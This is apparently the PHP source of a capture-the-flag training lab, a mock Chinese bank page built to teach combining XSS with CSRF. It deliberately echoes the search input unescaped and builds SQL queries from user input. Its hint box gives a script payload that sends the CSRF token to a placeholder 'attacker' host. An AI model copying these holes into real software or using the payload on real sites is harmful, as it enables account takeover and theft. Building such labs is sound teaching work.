<?php
require_once 'config.php';

session_start();
$_SESSION['username'] = 'victim';
$_SESSION['user_id'] = 2;

$message = '';
$balance = 0;

$result = $conn->query("SELECT balance FROM users WHERE username = 'victim'");
if ($result && $row = $result->fetch_assoc()) {
    $balance = $row['balance'];
}

// Generate proper CSRF token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Handle POST transfer with proper CSRF token validation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['to']) && isset($_POST['amount'])) {
    // Secure: Proper CSRF token validation
    if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
        $to = $_POST['to'];
        $amount = floatval($_POST['amount']);

        if ($amount > 0 && $balance >= $amount) {
            $conn->query("UPDATE users SET balance = balance - $amount WHERE username = 'victim'");
            $conn->query("UPDATE users SET balance = balance + $amount WHERE username = '$to'");
            $conn->query("INSERT INTO transfers (from_user, to_user, amount) VALUES ('victim', '$to', $amount)");
            $message = "转账成功！向 $to 转账 ¥$amount";
            $balance -= $amount;
        } elseif ($amount > 0) {
            $message = '余额不足！';
        }
    } else {
        $message = 'CSRF Token 无效！';
    }
}

// Handle XSS vulnerability in search
$search = $_GET['q'] ?? '';
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Hell - CSRF + XSS 组合</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #f5f5f5; font-family: -apple-system, sans-serif; padding: 2rem; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #ef4444; margin-bottom: 0.5rem; }
        .subtitle { color: #a1a1aa; margin-bottom: 2rem; font-size: 0.9rem; }
        .hint { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1rem; margin-bottom: 2rem; }
        .hint h3 { color: #ef4444; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .hint p { color: #a1a1aa; font-size: 0.85rem; }
        .hint code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
        .user-info {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 1.5rem; margin-bottom: 2rem; display: flex; justify-content: space-between; align-items: center;
        }
        .user-info .user { font-size: 1.1rem; font-weight: 600; }
        .user-info .balance { color: #ef4444; font-size: 1.5rem; font-weight: 700; }
        .search-box { display: flex; gap: 1rem; margin-bottom: 2rem; }
        input[type="text"], input[type="number"] {
            flex: 1; padding: 0.75rem 1rem; background: #1a1a1a; border: 1px solid #27272a;
            color: #f5f5f5; border-radius: 8px; font-size: 1rem;
        }
        input:focus { outline: none; border-color: #ef4444; }
        button {
            padding: 0.75rem 1.5rem; background: #ef4444; color: white; border: none;
            border-radius: 8px; cursor: pointer; font-size: 1rem;
        }
        button:hover { background: #dc2626; }
        .transfer-form {
            background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px;
            padding: 2rem; margin-bottom: 2rem;
        }
        .transfer-form h3 { margin-bottom: 1.5rem; }
        .form-row { display: flex; gap: 1rem; margin-bottom: 1rem; align-items: end; }
        .form-group { flex: 1; }
        .form-group label { display: block; color: #a1a1aa; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .message { padding: 1rem; border-radius: 8px; margin-bottom: 1rem; }
        .message.success { background: #0a1a0a; border: 1px solid #003f00; color: #10b981; }
        .message.error { background: #1a0000; border: 1px solid #3f0000; color: #ef4444; }
        .search-result { background: #1a1a1a; border: 1px solid #27272a; border-radius: 8px; padding: 1.5rem; margin-bottom: 2rem; }
        .token-display {
            background: #1e1e2e; padding: 0.75rem; border-radius: 8px; margin-bottom: 1rem;
            font-family: monospace; font-size: 0.85rem; color: #a1a1aa; word-break: break-all;
        }
        .info { background: #1a0000; border: 1px solid #3f0000; border-radius: 8px; padding: 1rem; margin-top: 2rem; }
        .info h3 { color: #ef4444; font-size: 0.9rem; margin-bottom: 0.5rem; }
        .info p { color: #a1a1aa; font-size: 0.85rem; }
        .info code { background: #27272a; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.85rem; }
    </style>
</head>
<body>
    <div class="container">
        <h1>在线银行系统</h1>
        <p class="subtitle">用户: victim | CyberRange CSRF Hell Lab</p>

        <div class="hint">
            <h3>学习目标</h3>
            <p>这个靶场有完善的 CSRF Token 保护，无法直接进行 CSRF 攻击。</p>
            <p>但页面有 XSS 漏洞，你可以结合 XSS 来窃取 CSRF Token，然后发起 CSRF 攻击。</p>
            <p>这是一个高级挑战，需要组合两种漏洞实现攻击。</p>
        </div>

        <div class="user-info">
            <span class="user">当前用户: victim</span>
            <span class="balance">余额: ¥<?php echo number_format($balance, 2); ?></span>
        </div>

        <?php if ($message): ?>
            <div class="message <?php echo strpos($message, '成功') !== false ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <div class="search-box">
            <form method="GET" style="display: flex; gap: 1rem; flex: 1;">
                <input type="text" name="q" placeholder="搜索交易记录..." value="<?php echo $search; ?>">
                <button type="submit">搜索</button>
            </form>
        </div>

        <?php if ($search !== ''): ?>
            <div class="search-result">
                <h3>搜索结果</h3>
                <p>搜索关键词: <?php echo $search; ?></p>
                <p style="color: #a1a1aa;">未找到相关交易记录</p>
            </div>
        <?php endif; ?>

        <div class="token-display">
            CSRF Token: <?php echo $_SESSION['csrf_token']; ?>
        </div>

        <div class="transfer-form">
            <h3>转账</h3>
            <form method="POST" id="transferForm">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <div class="form-row">
                    <div class="form-group">
                        <label>收款人</label>
                        <input type="text" name="to" placeholder="输入收款人用户名" required>
                    </div>
                    <div class="form-group">
                        <label>金额</label>
                        <input type="number" name="amount" placeholder="输入转账金额" min="0.01" step="0.01" required>
                    </div>
                    <button type="submit">转账</button>
                </div>
            </form>
        </div>

        <div class="info">
            <h3>攻击思路</h3>
            <p>1. 发现搜索功能有 XSS 漏洞（<code>$search</code> 直接输出）</p>
            <p>2. 构造 XSS Payload 窃取 CSRF Token：</p>
            <p><code>&lt;script&gt;fetch('http://attacker/steal?token='+document.querySelector('[name=csrf_token]').value)&lt;/script&gt;</code></p>
            <p>3. 获取 Token 后，发起 CSRF 攻击</p>
            <p>4. 或者直接用 XSS 修改表单并提交</p>
            <p>flag 格式: <code>CR{...}</code> (成功转账后显示)</p>
        </div>
    </div>
</body>
</html>
